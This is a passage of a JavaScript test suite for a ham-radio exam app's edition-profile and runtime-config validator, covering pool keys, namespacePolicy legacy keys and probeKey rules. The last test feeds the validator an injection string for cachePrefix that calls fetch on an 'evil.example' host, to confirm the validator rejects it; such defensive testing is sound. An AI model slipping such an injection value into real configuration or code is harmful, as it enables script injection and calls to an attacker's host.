      assert.ok(!ep.RUNTIME_CONFIG_KEYS.has(poolField),
        `${poolField} is pool-specific and must stay in HAM_EXAM_POOLS`);
      expectRuntimeErrors(makeRuntimeConfig({ [poolField]: 'x' }),
        new RegExp(`unknown key\\(s\\): ${poolField}`));
    }
  });
});

// --------------------------------------------------------------------------
// Stage 8A2: policy seams (docs/EDITION_BUILDS_DESIGN.md)
// --------------------------------------------------------------------------

// A minimal valid NON-US-shaped profile: pool keys outside the US registry,
// build.questionBanks keyed by those same keys. Only valid when the caller
// passes the matching options.poolKeys seam (or the US default is overridden).
function makeForeignProfile(overrides) {
  const base = {
    schemaVersion: 1,
    editionKey: 'in-asoc',
    displayName: 'Synthetic Edition',
    subtitle: 'Synthetic subtitle',
    jurisdiction: 'Nowhere',
    authority: {
      regulatorName: 'Synthetic Regulator',
      regulatorAbbreviation: 'SR',
      poolSourceName: 'Synthetic Source',
      poolSourceAbbreviation: 'SS'
    },
    poolKeys: ['alpha', 'beta'],
    defaultPoolKey: 'alpha',
    labels: {
      referenceLabelTemplate: 'SR reference: {ref}',
      sourceLabelTemplate: '{poolSourceAbbreviation} source',
      elementLabelTemplate: 'Element {element}',
      elementTermLabel: 'SR element'
    },
    examTimerSecondsValues: [0, 900],
    namespacePolicy: {
      storageKey: 'syn-state',
      legacyKeys: ['syn-pool', 'syn-theme', 'syn-index-{poolKey}', 'syn-bookmarks-{poolKey}'],
      cachePrefix: 'syn-'
    },
    build: {
      poolRegistry: 'data/synthetic-pools.json',
      questionBanks: { alpha: 'data/alpha.json', beta: 'data/beta.json' }
    }
  };
  return Object.assign({}, base, overrides || {});
}

describe('poolKeys seam (Stage 8A2 options.poolKeys)', () => {
  test('a synthetic key set validates clean when passed via options.poolKeys', () => {
    const profile = makeForeignProfile();
    assert.deepEqual(
      ep.validateEditionProfile(profile, { poolKeys: ['alpha', 'beta'] }),
      { errors: [] });
    assert.doesNotThrow(() => ep.assertEditionProfile(profile, { poolKeys: ['alpha', 'beta'] }));
  });

  test('the same profile fails without the seam (US default set)', () => {
    const { errors } = ep.validateEditionProfile(makeForeignProfile());
    assert.ok(errors.some((e) => /poolKeys: unknown pool key "alpha"/.test(e)),
      `expected the US-default cross-check to reject "alpha", got:\n${errors.join('\n')}`);
  });

  test('a mismatched options.poolKeys set fails with the existing diagnostics', () => {
    const profile = makeForeignProfile();
    // "gamma" demanded but absent; "beta" present but not in the expected set.
    let { errors } = ep.validateEditionProfile(profile, { poolKeys: ['alpha', 'gamma'] });
    assert.ok(errors.some((e) => /poolKeys: missing required pool "gamma"/.test(e)));
    assert.ok(errors.some((e) => /poolKeys: unknown pool key "beta"/.test(e)));

    // Missing expected key: a smaller expected set turns "beta" into an
    // unknown key (missing-pool diagnostics only fire for expected-set keys).
    ({ errors } = ep.validateEditionProfile(profile, { poolKeys: ['alpha'] }));
    assert.ok(errors.some((e) => /poolKeys: unknown pool key "beta"/.test(e)));

    // Extra expected key (questionBanks is then also missing a mapping).
    ({ errors } = ep.validateEditionProfile(profile, { poolKeys: ['alpha', 'beta', 'gamma'] }));
    assert.ok(errors.some((e) => /poolKeys: missing required pool "gamma"/.test(e)));
    assert.ok(errors.some((e) => /build\.questionBanks: missing required mapping for pool "gamma"/.test(e)));
  });
});

describe('namespacePolicy probeKey and positional legacyKeys (Stage 8A2)', () => {
  test('probeKey is accepted when present (profile and real edition.json)', () => {
    const profile = makeProfile();
    profile.namespacePolicy.probeKey = 'ham-exam-probe';
    assert.deepEqual(ep.validateEditionProfile(profile), { errors: [] });

    const real = loadReal();
    real.namespacePolicy.probeKey = 'ham-exam-probe';
    assert.deepEqual(ep.validateEditionProfile(real), { errors: [] },
      'the real data/edition.json still validates with zero errors when a probeKey is declared');
  });

  test('a blank or non-string probeKey is rejected', () => {
    for (const bad of ['', '   ', 42, null]) {
      const profile = makeProfile();
      profile.namespacePolicy.probeKey = bad;
      expectErrors(profile, /namespacePolicy\.probeKey must be a non-blank string when present/);
    }
  });

  test('legacyKeys must have exactly four entries', () => {
    const short = makeProfile();
    short.namespacePolicy.legacyKeys = ['ham-exam-pool', 'ham-exam-theme', 'ham-exam-index-{poolKey}'];
    expectErrors(short, /namespacePolicy\.legacyKeys must have exactly 4 entries/);

    const long = makeProfile();
    long.namespacePolicy.legacyKeys =
      ['a', 'b', 'c-{poolKey}', 'd-{poolKey}', 'e'];
    expectErrors(long, /namespacePolicy\.legacyKeys must have exactly 4 entries/);
  });

  test('legacyKeys slots 0/1 must not contain "{poolKey}"', () => {
    const slot0 = makeProfile();
    slot0.namespacePolicy.legacyKeys =
      ['ham-exam-{poolKey}', 'ham-exam-theme', 'ham-exam-index-{poolKey}', 'ham-exam-bookmarks-{poolKey}'];
    expectErrors(slot0, /namespacePolicy\.legacyKeys\[0\] \(the legacy pool key\) must not contain the "\{poolKey\}" placeholder/);

    const slot1 = makeProfile();
    slot1.namespacePolicy.legacyKeys =
      ['ham-exam-pool', 'ham-exam-theme-{poolKey}', 'ham-exam-index-{poolKey}', 'ham-exam-bookmarks-{poolKey}'];
    expectErrors(slot1, /namespacePolicy\.legacyKeys\[1\] \(the legacy theme key\) must not contain the "\{poolKey\}" placeholder/);
  });

  test('legacyKeys slots 2/3 must contain "{poolKey}"', () => {
    const slot2 = makeProfile();
    slot2.namespacePolicy.legacyKeys =
      ['ham-exam-pool', 'ham-exam-theme', 'ham-exam-index', 'ham-exam-bookmarks-{poolKey}'];
    expectErrors(slot2, /namespacePolicy\.legacyKeys\[2\] \(the per-pool index template\) must contain the "\{poolKey\}" placeholder/);

    const slot3 = makeProfile();
    slot3.namespacePolicy.legacyKeys =
      ['ham-exam-pool', 'ham-exam-theme', 'ham-exam-index-{poolKey}', 'ham-exam-bookmarks'];
    expectErrors(slot3, /namespacePolicy\.legacyKeys\[3\] \(the per-pool bookmarks template\) must contain the "\{poolKey\}" placeholder/);
  });

  test('the positional contract keeps rejecting blank and duplicate entries', () => {
    const dup = makeProfile();
    dup.namespacePolicy.legacyKeys =
      ['ham-exam-pool', 'ham-exam-pool', 'ham-exam-index-{poolKey}', 'ham-exam-bookmarks-{poolKey}'];
    expectErrors(dup, /namespacePolicy\.legacyKeys: duplicate entry "ham-exam-pool"/);

    const blank = makeProfile();
    blank.namespacePolicy.legacyKeys = ['ham-exam-pool', '  ', 'ham-exam-index-{poolKey}', 'ham-exam-bookmarks-{poolKey}'];
    expectErrors(blank, /namespacePolicy\.legacyKeys\[1\] must be a non-blank string/);
  });
});

describe('runtime projection namespacePolicy (Stage 8A2)', () => {
  // namespacePolicy is allowlisted AND required in the runtime projection:
  // scripts/build.js's buildEditionRuntimeConfig() now always projects it
  // (every valid profile has one -- it is a required profile root key), so
  // an absent namespacePolicy here can only mean a derivation bug, exactly
  // what this defense-in-depth gate exists to catch.
  test('an absent namespacePolicy is rejected, naming the missing field', () => {
    const config = makeRuntimeConfig();
    delete config.namespacePolicy;
    expectRuntimeErrors(config, /runtimeConfig: missing required field "namespacePolicy"/);
  });

  test('a malformed projected namespacePolicy is rejected with the same contract as the profile', () => {
    expectRuntimeErrors(makeRuntimeConfig({ namespacePolicy: 'ham-exam-' }),
      /runtimeConfig\.namespacePolicy must be an object/);
    expectRuntimeErrors(makeRuntimeConfig({
      namespacePolicy: {
        storageKey: 'ham-exam-state',
        legacyKeys: ['ham-exam-pool', 'ham-exam-theme', 'ham-exam-index-{poolKey}'],
        cachePrefix: 'ham-exam-'
      }
    }), /runtimeConfig\.namespacePolicy\.legacyKeys must have exactly 4 entries/);
    expectRuntimeErrors(makeRuntimeConfig({
      namespacePolicy: {
        storageKey: 'ham-exam-state',
        legacyKeys: ['ham-exam-pool-{poolKey}', 'ham-exam-theme', 'ham-exam-index-{poolKey}', 'ham-exam-bookmarks-{poolKey}'],
        cachePrefix: 'ham-exam-'
      }
    }), /runtimeConfig\.namespacePolicy\.legacyKeys\[0\] \(the legacy pool key\) must not contain the "\{poolKey\}" placeholder/);
    expectRuntimeErrors(makeRuntimeConfig({
      namespacePolicy: {
        storageKey: 'ham-exam-state',
        legacyKeys: ['ham-exam-pool', 'ham-exam-theme', 'ham-exam-index-{poolKey}', 'ham-exam-bookmarks-{poolKey}'],
        cachePrefix: 'ham-exam-',
        probeKey: ' '
      }
    }), /runtimeConfig\.namespacePolicy\.probeKey must be a non-blank string when present/);
  });

  test('a projected namespacePolicy with a probeKey validates clean', () => {
    const config = makeRuntimeConfig();
    config.namespacePolicy.probeKey = 'ham-exam-probe';
    assert.deepEqual(ep.validateEditionRuntimeConfig(config), { errors: [] });
  });

  test('the seven original fields are still enforced alongside namespacePolicy', () => {
    for (const field of [
      'poolKeys', 'defaultPoolKey', 'referenceLabelPrefix', 'elementLabelPrefix',
      'sourceLabelText', 'examTimerSecondsValues', 'displayName'
    ]) {
      const config = makeRuntimeConfig();
      delete config[field];
      expectRuntimeErrors(config, new RegExp(`missing required field "${field}"`));
    }
  });

  // Stage 8C: validateNamespacePolicy() is the SAME function both
  // validateEditionProfile() and validateEditionRuntimeConfig() call, so the
  // cachePrefix shape gate applies identically to the derived projection --
  // a derivation bug that mangled cachePrefix would be caught here too.
  test('a malformed cachePrefix in the derived projection is rejected the same way as in the profile', () => {
    const config = makeRuntimeConfig({
      namespacePolicy: Object.assign({}, makeRuntimeConfig().namespacePolicy, {
        cachePrefix: 'x"; fetch("https://evil.example"); //'
      })
    });
    expectRuntimeErrors(config, /namespacePolicy\.cachePrefix must be lowercase letters\/digits, hyphen-separated, ending in a hyphen/);
  });
});
